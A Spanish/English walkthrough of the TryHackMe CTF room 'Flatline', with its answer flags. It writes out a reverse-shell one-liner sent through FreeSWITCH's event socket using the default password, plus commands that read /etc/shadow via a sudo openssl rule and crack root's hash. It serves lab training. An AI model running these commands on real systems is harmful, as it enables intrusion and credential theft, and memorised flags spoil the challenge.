# Flatline

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|-----------|------|------|------|---------|--------|--------------|---------|
| Easy | ctf | `flatline` | https://tryhackme.com/room/flatline | 01 Level Easy | TryHackMe | FreeSWITCH / mod_event_socket / RDP / ClueCon / openssl sudo / linpeas | Ofensivo: explotar el servicio FreeSWITCH (mod_event_socket) para ejecutar comandos y escalar a root abusando de la regla sudo de openssl. |

---

> **Objeto:** Comprometer la máquina aprovechando una configuración débil del servicio FreeSWITCH: iniciar sesión en el event socket con la contraseña por defecto (`ClueCon`), ejecutar comandos del sistema para obtener una shell y escalar a root mediante el binario `openssl` permitido con sudo.

**Contexto:** Sala CTF (by Arrexel) en la que un servidor debilitado expone servicios poco habituales. El escaneo inicial revela `FreeSWITCH` en el puerto `8021` (mod_event_socket) y RDP en el `3389`. FreeSWITCH permite autenticarse contra su event socket con la contraseña por defecto `ClueCon`, y desde la consola se pueden ejecutar llamadas a la API `system` que materializan comandos del sistema operativo. Con una shell obtenida se recupera la flag de usuario y, usando `sudo -l`, se abusa de la regla que permite ejecutar `openssl` como root para leer `/etc/shadow`, descifrar la contraseña de root y ganar acceso total.

> **ES:** "Flatline" — aprovechar FreeSWITCH (pw por defecto `ClueCon`) para RCE y escalar por sudo `openssl`.
> **EN:** A CTF box where FreeSWITCH's default event-socket password (`ClueCon`) grants command execution, and a sudo'd `openssl` allows reading `/etc/shadow` to escalate to root.

## Solucionario

### Task 1: Reconocimiento / Recon

**Explicación:** Con un escaneo de puertos (enum2/nmap) se identifican los servicios abiertos: RDP en `3389` y el mod_event_socket de FreeSWITCH en `8021`. El evento con la respuesta `Authentication Challenge` confirma el servicio de FreeSWITCH.

```bash
nmap -sV -sC <IP>
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What ports are open on the box? / ¿Qué puertos están abiertos? | `3389` (RDP) y `8021` (FreeSWITCH mod_event_socket) |

### Task 2: Explotación / Exploitation

**Explicación:** FreeSWITCH expone `mod_event_socket` en el puerto `8021`. Enviando `auth ClueCon` se inicia sesión con la contraseña por defecto del producto. Desde la consola del event socket se invoca la API de FreeSWITCH: el comando `bgapi system <cmd>` (o a través del exploit `Fs_Exploit.py`) permite ejecutar comandos del sistema. Se inyecta una reverse shell (p. ej. `bash -i >& /dev/tcp/<IP>/4444 0>&1`) y se captura con `nc -lvnp 4444`. La shell resultante corre como el usuario del servicio, con el que se localiza y lee la flag de usuario.

```bash
# Consola del event socket (8021)
auth ClueCon
bgapi system bash -c 'bash -i >& /dev/tcp/<atacante>/4444 0>&1'

# Listener local del atacante
nc -lvnp 4444
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 2 | What is the user flag? / ¿Cuál es la flag de usuario? | `THM{64bca0843d535fa73eecdc59d27cbe26}` |

### Task 3: Escalada de privilegios / Privilege Escalation

**Explicación:** Con `sudo -l` se observa que el usuario puede ejecutar `openssl` como root sin contraseña. Como `openssl enc` puede leer cualquier archivo, se usa para volcar `/etc/shadow` y extraer el hash de la contraseña de root. El hash se rompe offline con `john` y se hace `su root` con la contraseña recuperada, leyendo finalmente la flag de root.

```bash
sudo -l
sudo openssl enc -in /etc/shadow                                  # leer /etc/shadow como root
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
su root
cat /root/root.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 3 | What is the root flag? / ¿Cuál es la flag de root? | `THM{8c8bc5558f0f3f8060d00ca231a9fb5e}` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What ports are open on the box? | `3389` (RDP) y `8021` (FreeSWITCH mod_event_socket) |
| 2 | What is the user flag? | `THM{64bca0843d535fa73eecdc59d27cbe26}` |
| 3 | What is the root flag? | `THM{8c8bc5558f0f3f8060d00ca231a9fb5e}` |

---

**Metodología:** Escaneo de puertos para descubrir los servicios (RDP 3389 y FreeSWITCH 8021). Autenticación en el mod_event_socket con la contraseña por defecto `ClueCon` y ejecución de una reverse shell a través de la API `system`. Post-explotación: enumeración con `sudo -l` para detectar la regla que permite `openssl` como root, lectura de `/etc/shadow` con `openssl enc -in`, crackeo del hash con john y acceso `su root` para culminar con las flags.

### Cadena de ataque / Attack Chain

```text
nmap (3389 RDP, 8021 FreeSWITCH) -> auth ClueCon en mod_event_socket -> bgapi system reverse shell -> flag de usuario -> sudo -l -> openssl enc -in /etc/shadow -> john -> su root -> flag de root
```

**Learning chain:** FreeSWITCH RCE -> event socket default creds -> API command execution -> reverse shell -> sudo misconfiguration -> shadow read -> credential cracking -> root.

**Lección:** *Los servicios de administración con credenciales por defecto y las reglas sudo demasiado amplias (`openssl` puede leer cualquier archivo) son el camino directo a root; la enumeración (`sudo -l`, nmap) es clave en cada fase.*

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell; T1068 — Exploitation for Privilege Escalation

**Fuente:** [TryHackMe - Flatline](https://tryhackme.com/room/flatline)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.